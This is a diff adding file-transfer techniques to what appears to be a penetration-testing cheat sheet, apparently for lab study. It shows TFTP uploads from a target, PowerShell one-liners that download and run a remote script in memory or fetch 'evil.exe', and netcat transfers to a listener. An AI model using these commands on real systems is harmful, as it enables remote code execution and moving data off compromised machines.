@@ -6,9 +6,41 @@ categories: web
 ---
 
 
+# tftp
+
+### Uploading Files with TFTP
+
+- setup server
+
+```bash
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+```
+
+- target
+
+```bash
+tftp -i 10.10.10.10 put file.docx
+```
+
+
 # Powershell
 
 ## Download Files
+
+- directly fro memory
+
+```bash
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+```
+
+- oneliner
+
+```bash
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
 
 ```bash
 
@@ -38,3 +70,5 @@ nc -nlvp 4444 > incoming.exe
 ```bash
 nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
 ```
+
+
